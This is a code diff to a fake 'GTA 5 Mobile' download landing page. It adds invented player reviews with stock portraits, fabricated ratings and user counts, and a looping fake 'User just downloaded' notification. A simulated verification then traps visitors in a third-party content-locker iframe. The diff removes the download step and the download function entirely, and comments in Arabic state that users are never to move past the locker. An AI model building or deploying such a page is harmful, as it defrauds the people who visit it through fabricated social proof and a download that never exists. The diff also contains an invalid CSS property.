@@ -37,13 +37,71 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
-        /* --- Background & Overlay --- */
-        .main-bg {
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.9)), 
-                        url('https://media-rockstargames-com.akamaized.net/rockstargames-newsite/img/global/games/fob/mobile/grand-theft-auto-v.jpg') center/cover no-repeat;
-            min-height: 100vh;
-            padding: 40px 20px;
-            background-attachment: scroll;
+        /* --- New Header Banner --- */
+        .header-banner {
+            width: 100%;
+            height: 180px;
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)),
+                        url('https://i.pinimg.com/1200x/28/a0/77/28a07796db8ba1a481007868998fc271.jpg') center/cover no-repeat;
+            position: relative;
+            margin-bottom: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        
+        .header-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(56, 239, 125, 0.1);
+            mix-blend-mode: overlay;
+        }
+        
+        .header-banner::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 40px;
+            background: linear-gradient(to top, var(--dark-bg), transparent);
+        }
+
+        .banner-content {
+            text-align: center;
+            z-index: 2;
+            padding: 20px;
+            position: relative;
+        }
+        
+        .banner-title {
+            font-family: 'Oswald', sans-serif;
+            font-size: 2.8rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            text-shadow: 3px 3px 10px rgba(0,0,0,0.9);
+        }
+        
+        .banner-title span {
+            color: var(--gta-green);
+        }
+        
+        .banner-subtitle {
+            font-size: 1rem;
+            color: #ddd;
+            text-shadow: 2px 2px 5px rgba(0,0,0,0.7);
+            font-weight: 600;
+        }
+
+        /* --- Main Content --- */
+        .main-content {
+            padding: 0 20px 100px;
         }
 
         /* --- Fake Top Notification --- */
@@ -55,7 +113,7 @@
             background: rgba(0, 0, 0, 0.85);
             backdrop-filter: blur(10px); 
             padding: 10px 15px; 
-            border-radius: 30px;
+            borderRadius: 30px;
             font-size: 0.75rem; 
             display: flex; 
             align-items: center; 
@@ -71,45 +129,13 @@
             color: var(--gta-green);
         }
 
-        /* --- Header --- */
-        header { 
-            text-align: left; 
-            margin-bottom: 30px; 
-            margin-top: 40px;
-        }
-        
-        .logo { 
-            width: 80px; 
-            margin-bottom: 15px;
-            image-rendering: -webkit-optimize-contrast;
-        }
-        
-        h1 { 
-            font-family: 'Oswald', sans-serif; 
-            font-size: 2.6rem; 
-            line-height: 1; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px;
-        }
-        
-        h1 span { 
-            color: var(--gta-green); 
-        }
-        
-        .hero-desc { 
-            font-size: 0.85rem; 
-            color: #ccc; 
-            margin-top: 15px; 
-            max-width: 90%;
-            line-height: 1.5;
-        }
-
         /* --- Gallery Section --- */
         .gallery-title { 
             font-family: 'Oswald'; 
             margin: 30px 0 15px; 
-            font-size: 1.4rem; 
+            font-size: 1.8rem; 
             font-weight: 700;
+            text-align: center;
         }
         
         .gallery-scroll { 
@@ -119,13 +145,21 @@
             padding-bottom: 10px; 
             scrollbar-width: none;
             -webkit-overflow-scrolling: touch;
+            margin-top: 20px;
         }
         
         .gallery-scroll img { 
-            width: 260px; 
+            width: 280px; 
+            height: 160px;
+            object-fit: cover;
             border-radius: 12px; 
             border: 1px solid #333;
             image-rendering: -webkit-optimize-contrast;
+            transition: transform 0.3s ease;
+        }
+        
+        .gallery-scroll img:hover {
+            transform: scale(1.02);
         }
         
         .gallery-scroll::-webkit-scrollbar { 
@@ -136,17 +170,186 @@
         .stats-row { 
             display: flex; 
             justify-content: space-between; 
-            margin-top: 15px; 
-            font-size: 0.7rem; 
+            margin-top: 25px; 
+            font-size: 0.8rem; 
             color: #999; 
             border-bottom: 1px solid #222; 
-            padding-bottom: 15px;
+            padding-bottom: 20px;
             flex-wrap: wrap;
+        }
+        
+        .stats-row span { 
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
         
         .stats-row span i { 
             color: gold; 
-            margin-right: 3px; 
+        }
+
+        /* --- User Reviews Section --- */
+        .reviews-section {
+            margin: 40px 0 30px;
+        }
+        
+        .reviews-title {
+            font-family: 'Oswald', sans-serif;
+            font-size: 1.8rem;
+            text-align: center;
+            margin-bottom: 25px;
+            color: var(--gta-green);
+        }
+        
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .review-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .review-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(56, 239, 125, 0.1);
+        }
+        
+        .review-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .review-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid var(--gta-green);
+            object-fit: cover;
+        }
+        
+        .review-user h4 {
+            font-size: 1rem;
+            margin-bottom: 5px;
+        }
+        
+        .review-user p {
+            font-size: 0.75rem;
+            color: #aaa;
+        }
+        
+        .review-stars {
+            display: flex;
+            gap: 3px;
+            margin-bottom: 10px;
+        }
+        
+        .review-stars i {
+            color: gold;
+            font-size: 0.9rem;
+        }
+        
+        .review-content {
+            font-size: 0.85rem;
+            line-height: 1.5;
+            color: #ddd;
+            margin-bottom: 15px;
+        }
+        
+        .review-footer {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: #777;
+        }
+        
+        .review-device {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .review-rating {
+            font-weight: 600;
+            color: var(--gta-green);
+        }
+        
+        .review-stats {
+            background: rgba(56, 239, 125, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin-top: 20px;
+            border: 1px solid rgba(56, 239, 125, 0.2);
+        }
+        
+        .review-stats h4 {
+            margin-bottom: 10px;
+            color: var(--gta-green);
+        }
+        
+        .stats-numbers {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .stat-number {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: white;
+        }
+        
+        .stat-label {
+            font-size: 0.7rem;
+            color: #aaa;
+        }
+
+        /* --- Features Grid --- */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+        
+        .feature-card i {
+            color: var(--gta-green);
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .feature-card h4 {
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+        
+        .feature-card p {
+            font-size: 0.75rem;
+            color: #aaa;
         }
 
         /* --- Verification Explanation --- */
@@ -156,7 +359,7 @@
             border-radius: 10px;
             padding: 12px 15px;
             margin: 20px 0;
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             text-align: center;
             color: #e0e0e0;
             display: none;
@@ -174,6 +377,7 @@
             left: 50%; 
             transform: translateX(-50%);
             width: 90%; 
+            max-width: 400px;
             z-index: 500;
             animation: slideUp 0.5s ease-out;
         }
@@ -349,6 +553,7 @@
             margin-top: 15px; 
             border-radius: 10px;
             background: #1a1b1c;
+            display: block;
         }
         
         .locker-header {
@@ -367,28 +572,23 @@
             color: #aaa;
         }
 
-        /* --- Final Step --- */
-        .final-step {
-            text-align: center;
-            padding: 20px;
+        /* --- Verification Progress Bar --- */
+        .verification-progress {
             display: none;
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin: 15px 0;
+            overflow: hidden;
         }
         
-        .final-step i {
-            font-size: 3rem;
-            color: var(--gta-green);
-            margin-bottom: 15px;
-        }
-        
-        .final-step h4 {
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-        }
-        
-        .final-step p {
-            font-size: 0.9rem;
-            color: #aaa;
-            margin-bottom: 20px;
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--gta-green);
+            border-radius: 2px;
+            transition: width 3s ease;
         }
 
         /* --- Footer --- */
@@ -407,8 +607,24 @@
         }
         
         @media (max-width: 480px) {
-            h1 {
-                font-size: 2.4rem;
+            .header-banner {
+                height: 160px;
+            }
+            
+            .banner-title {
+                font-size: 2.2rem;
+            }
+            
+            .banner-subtitle {
+                font-size: 0.9rem;
+            }
+            
+            .reviews-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .review-card {
+                padding: 15px;
             }
             
             .btn-green {
@@ -419,35 +635,38 @@
             .modal-box {
                 padding: 20px;
             }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
         }
         
         @media (max-width: 360px) {
-            h1 {
-                font-size: 2.2rem;
+            .banner-title {
+                font-size: 2rem;
             }
             
             .gallery-scroll img {
-                width: 220px;
+                width: 240px;
             }
         }
     </style>
 </head>
 <body>
 
-    <div class="main-bg">
-        <div class="top-notif" id="topNotification">
-            <i class="fas fa-user-circle"></i> 
-            <span id="notificationText">User_887 just downloaded for Android</span>
+    <div class="top-notif" id="topNotification">
+        <i class="fas fa-user-circle"></i> 
+        <span id="notificationText">User_887 just downloaded for Android</span>
+    </div>
+
+    <div class="header-banner">
+        <div class="banner-content">
+            <h1 class="banner-title">GTA 5 <span>Mobile</span></h1>
+            <p class="banner-subtitle">The Ultimate Mobile Gaming Experience</p>
         </div>
+    </div>
 
-        <header>
-            <img src="https://i.pinimg.com/1200x/57/43/cb/5743cb782cb73bd8b2e2b0acc876c1e5.jpg" 
-                 class="logo" 
-                 alt="GTA 5 Logo">
-            <h1>GTA 5 <span>Mobile</span></h1>
-            <p class="hero-desc">Experience the full Grand Theft Auto V world on your Android & iOS devices. High-definition immersive story for mobile performance.</p>
-        </header>
-
+    <div class="main-content">
         <h2 class="gallery-title">Vast Open World</h2>
         <div class="gallery-scroll">
             <img src="https://i.ytimg.com/vi/8qsumch7S_s/maxresdefault.jpg" 
@@ -461,11 +680,143 @@
                  loading="lazy">
         </div>
 
-        <div class="stats-row">
-            <span>1.2M+ Players</span>
-            <span>4.8 <i class="fas fa-star"></i> Rating</span>
-            <span>24/7 Online Support</span>
+        <div class="features-grid">
+            <div class="feature-card">
+                <i class="fas fa-gamepad"></i>
+                <h4>Full Gameplay</h4>
+                <p>Complete story mode & online</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-mobile-alt"></i>
+                <h4>Optimized</h4>
+                <p>For mobile performance</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-car"></i>
+                <h4>All Vehicles</h4>
+                <p>200+ cars, planes, boats</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-map"></i>
+                <h4>Open World</h4>
+                <p>Los Santos fully explorable</p>
+            </div>
         </div>
+
+        <div class="stats-row">
+            <span><i class="fas fa-users"></i> 1.2M+ Players</span>
+            <span><i class="fas fa-star"></i> 4.8 Rating</span>
+            <span><i class="fas fa-headset"></i> 24/7 Support</span>
+        </div>
+
+        <!-- User Reviews Section -->
+        <section class="reviews-section">
+            <h3 class="reviews-title">What Players Are Saying</h3>
+            
+            <div class="reviews-grid">
+                <!-- Review 1 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="User Avatar" class="review-avatar">
+                        <div class="review-user">
+                            <h4>Alex Johnson</h4>
+                            <p>2 days ago</p>
+                        </div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                    <p class="review-content">
+                        "Incredible port! Runs smoothly on my Samsung S23. Graphics are amazing and the controls are well optimized for touch. Best mobile game I've played!"
+                    </p>
+                    <div class="review-footer">
+                        <div class="review-device">
+                            <i class="fab fa-android" style="color: #a4c639;"></i>
+                            <span>Android</span>
+                        </div>
+                        <div class="review-rating">5/5</div>
+                    </div>
+                </div>
+                
+                <!-- Review 2 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="User Avatar" class="review-avatar">
+                        <div class="review-user">
+                            <h4>Maria Garcia</h4>
+                            <p>1 week ago</p>
+                        </div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star-half-alt"></i>
+                    </div>
+                    <p class="review-content">
+                        "The iOS version works perfectly on my iPhone 14 Pro. Touch controls take some getting used to, but Bluetooth controller support is flawless."
+                    </p>
+                    <div class="review-footer">
+                        <div class="review-device">
+                            <i class="fab fa-apple"></i>
+                            <span>iOS</span>
+                        </div>
+                        <div class="review-rating">4.5/5</div>
+                    </div>
+                </div>
+                
+                <!-- Review 3 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/men/67.jpg" alt="User Avatar" class="review-avatar">
+                        <div class="review-user">
+                            <h4>David Chen</h4>
+                            <p>3 days ago</p>
+                        </div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="far fa-star"></i>
+                    </div>
+                    <p class="review-content">
+                        "Impressive graphics and full story mode included. The file size is large but worth it. Multiplayer works great with friends!"
+                    </p>
+                    <div class="review-footer">
+                        <div class="review-device">
+                            <i class="fab fa-android" style="color: #a4c639;"></i>
+                            <span>Android Tablet</span>
+                        </div>
+                        <div class="review-rating">4/5</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="review-stats">
+                <h4>Community Rating Summary</h4>
+                <div class="stats-numbers">
+                    <div class="stat-item">
+                        <div class="stat-number">4.8</div>
+                        <div class="stat-label">Average Rating</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">12.4K</div>
+                        <div class="stat-label">Reviews</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">94%</div>
+                        <div class="stat-label">Recommend</div>
+                    </div>
+                </div>
+            </div>
+        </section>
 
         <footer>
             Privacy Policy | Terms & Service
@@ -512,28 +863,25 @@
 
             <div id="locker-step">
                 <div class="locker-header">
-                    <h4>Final Step: Verify & Download</h4>
-                    <p>Complete verification to start your download</p>
+                    <h4>Complete Verification to Download</h4>
+                    <p>Finish the tasks below to unlock your download</p>
                 </div>
                 
                 <div class="locker-card">
                     <div style="display: flex; align-items: center; gap: 10px;">
                         <div class="circle-num">1</div>
-                        <span style="font-size: 0.9rem; font-weight: 600;">Complete Verification</span>
+                        <span style="font-size: 0.9rem; font-weight: 600;">Complete the tasks below</span>
                     </div>
-                    <i class="fas fa-check-circle" style="color: #555;"></i>
+                    <i class="fas fa-check-circle" id="checkIcon" style="color: #555;"></i>
                 </div>
                 
-                <iframe id="verificationFrame" src="about:blank"></iframe>
-                
-                <div class="final-step" id="finalStep">
-                    <i class="fas fa-check-circle"></i>
-                    <h4>Verification Complete!</h4>
-                    <p>Your download will start automatically</p>
-                    <button class="btn-green" onclick="startDownload()" style="margin-top: 10px;">
-                        <i class="fas fa-download"></i> Start Download Now
-                    </button>
+                <div class="verification-progress" id="progressBar">
+                    <div class="progress-fill"></div>
                 </div>
+                
+                <iframe id="verificationFrame" src="https://d2xohqmdyl2cj3.cloudfront.net/public/locker.php?it=4321081&key=db20f"></iframe>
+                
+                <!-- تم إزالة قسم Final Step بالكامل -->
             </div>
         </div>
     </div>
@@ -554,7 +902,9 @@
         const mainCTA = document.getElementById('mainCTA');
         const verificationExplain = document.getElementById('verificationExplain');
         const verificationFrame = document.getElementById('verificationFrame');
-        const finalStep = document.getElementById('finalStep');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.querySelector('.progress-fill');
+        const checkIcon = document.getElementById('checkIcon');
 
         // State variables
         let selectedDevice = null;
@@ -593,9 +943,6 @@
             
             // Add touch event listeners for haptic feedback
             setupHapticFeedback();
-            
-            // Set initial verification frame
-            verificationFrame.src = 'https://d2xohqmdyl2cj3.cloudfront.net/public/locker.php?it=4321081&key=db20f';
             
             // Performance monitoring
             if ('connection' in navigator) {
@@ -692,8 +1039,12 @@
             document.getElementById('locker-step').style.display = 'none';
             verificationExplain.style.display = 'none';
             document.getElementById('locker-trigger').style.display = 'none';
-            finalStep.style.display = 'none';
             verificationFrame.style.display = 'block';
+            progressBar.style.display = 'none';
+            
+            // Reset progress
+            progressFill.style.width = '0%';
+            checkIcon.style.color = '#555';
             
             // Reset device selection
             selectedDevice = null;
@@ -733,36 +1084,30 @@
             document.getElementById('selection-step').style.display = 'none';
             document.getElementById('locker-step').style.display = 'block';
             
+            // Show verification frame and progress bar
+            verificationFrame.style.display = 'block';
+            progressBar.style.display = 'block';
+            
+            // Start progress animation
+            setTimeout(() => {
+                progressFill.style.width = '100%';
+            }, 100);
+            
             // Simulate verification process
             setTimeout(() => {
-                verificationFrame.style.display = 'none';
-                finalStep.style.display = 'block';
+                // Update check icon
+                checkIcon.style.color = '#38ef7d';
                 
-                // Update notification to show this user completed verification
+                // فقط نقوم بتحديث الإشعار
                 const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)] + 
                                  Math.floor(Math.random() * 9000 + 1000);
-                notificationText.textContent = `${randomUser} completed verification`;
+                notificationText.textContent = `${randomUser} is completing verification`;
             }, 3000); // Simulate 3 second verification
+            
+            // لا ننتقل إلى أي خطوة تالية - يبقى المستخدم عند الـ Content Locker
         }
 
-        function startDownload() {
-            playClick();
-            
-            // Vibrate for download start
-            if (navigator.vibrate) {
-                navigator.vibrate([50, 30, 50]);
-            }
-            
-            // Show download confirmation
-            alert(`Starting download for ${selectedDevice === 'android' ? 'Android (4.2GB APK)' : 'iOS (3.8GB IPA)'}\n\nYour download will begin shortly...`);
-            
-            // Update notification
-            const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)] + 
-                             Math.floor(Math.random() * 9000 + 1000);
-            notificationText.textContent = `${randomUser} started downloading`;
-            
-            closeModal();
-        }
+        // تم إزالة دالة startDownload بالكامل
 
         // Keyboard navigation support
         document.addEventListener('keydown', function(e) {
